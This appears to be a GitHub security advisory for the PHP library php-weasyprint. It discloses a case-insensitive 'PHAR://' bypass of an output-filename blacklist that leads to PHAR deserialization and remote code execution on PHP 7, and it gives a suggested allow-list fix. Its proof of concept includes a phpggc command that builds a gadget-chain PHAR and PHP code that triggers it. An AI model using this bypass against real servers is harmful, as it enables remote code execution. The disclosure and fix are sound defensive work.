# [H] PhpWeasyPrint vulnerable to PHAR deserialization via output filename (CVE-2023-28115 case-insensitive bypass)

## Summary
Severity: High
Advisory: GHSA-2fmj-p74r-3wjm
CVE: CVE-2026-49286
CWE: CWE-502
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-26
Source: https://github.com/advisories/GHSA-2fmj-p74r-3wjm
Type: github-advisory

## Affected
- Packagist: `pontedilana/php-weasyprint` — affected >=0 <2.6.0

## Details
### Summary

`pontedilana/php-weasyprint` guarded the output filename against the `phar://` stream wrapper with a case-sensitive blacklist:

```php
if (0 === \strpos($filename, 'phar://')) {
    throw new \InvalidArgumentException('The output file cannot be a phar archive.');
}
```

PHP stream wrappers are **case-insensitive**, so `PHAR://`, `Phar://`, etc. bypass the check and reach `fileExists()` (`file_exists()`) in `prepareOutput()`. On PHP 7 (which the library still supports — PHP 7.4+), this triggers deserialization of a crafted PHAR archive's metadata, leading to remote code execution. This is the patch-bypass of CVE-2023-28115.

The same issue and fix were handled upstream in KnpLabs/snappy ([GHSA-92rv-4j2h-8mjj](https://github.com/KnpLabs/snappy/security/advisories/GHSA-92rv-4j2h-8mjj)).

### Affected versions

`pontedilana/php-weasyprint` versions `<= 2.5.1` (the case-sensitive guard was introduced in commit `eb8accc`, "Implement countermeasures for CVE-2023-28115").

Patched in: `2.6.0`.

### Privilege required

A caller able to control the output filename passed to `generate()` / `generateFromHtml()`, plus the ability to place a PHAR archive on the filesystem (e.g. via an upload). Exploitation of the deserialization requires the server to run PHP < 8.

### Vulnerable code

`src/AbstractGenerator.php`, `prepareOutput()`:

```php
if (0 === \strpos($filename, 'phar://')) {
    throw new \InvalidArgumentException('The output file cannot be a phar archive.');
}
```

`strpos($filename, 'phar://')` matches only the exact lowercase string, while the wrapper resolution is case-insensitive — `PHAR://payload.phar` is not caught.

### Proof of concept

```bash
# Craft a PHAR with a fast-destruct gadget chain
phpggc -f Monolog/RCE1 exec 'touch /tmp/exploit' -p phar -o exploit.phar
```

```php
<?php
use Pontedilana\PhpWeasyPrint\Pdf;

$pdf = new Pdf('/usr/local/bin/weasyprint');
// Case-altered wrapper bypasses the lowercase 'phar://' blacklist
$pdf->generateFromHtml('<h1>POC</h1>', 'PHAR://exploit.phar');
// On PHP < 8, the PHAR metadata is deserialized -> /tmp/exploit is created
```

### Impact

- Remote code execution and filesystem access through PHAR metadata deserialization on PHP < 8, when the output filename is attacker-influenced and a PHAR can be planted.

CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (8.1, High) — Critical in deployments running PHP 7 with an upload surface; adjust to your environment.

CWE-502 (Deserialization of Untrusted Data).

### Suggested fix

Replace the case-sensitive blacklist with a scheme allow-list (`file` / no scheme), comparing the lowercased scheme parsed from the filename:

```php
protected const ALLOWED_PROTOCOLS = ['file'];

protected function isProtocolAllowed(string $filename): bool
{
    if (false === $parsed = \parse_url($filename)) {
        throw new \InvalidArgumentException('The filename is not valid.');
    }
    $protocol = isset($parsed['scheme']) ? \strtolower($parsed['scheme']) : 'file';
    // ...special-case Windows drive letters (C:\...) as 'file'...
    return \in_array($protocol, self::ALLOWED_PROTOCOLS, true);
}
```

`prepareOutput()` then rejects any non-`file` scheme (`phar`, `PHAR`, `php`, `http`, ...) before `file_exists()` is reached.

### Credit

Original vulnerability and patch-bypass reported upstream to KnpLabs/snappy by Rémi Matasse of Synacktiv ([GHSA-92rv-4j2h-8mjj](https://github.com/KnpLabs/snappy/security/advisories/GHSA-92rv-4j2h-8mjj)); identified as applicable to `pontedilana/php-weasyprint`, which mirrors the same code.

## References
- https://github.com/KnpLabs/snappy/security/advisories/GHSA-92rv-4j2h-8mjj
- https://github.com/pontedilana/php-weasyprint/security/advisories/GHSA-2fmj-p74r-3wjm
- https://nvd.nist.gov/vuln/detail/CVE-2026-49286
- https://github.com/pontedilana/php-weasyprint/commit/d1aa487722b5a3cab9b222b85fdb5608a5a550c3
- https://github.com/pontedilana/php-weasyprint
- https://github.com/pontedilana/php-weasyprint/releases/tag/2.6.0
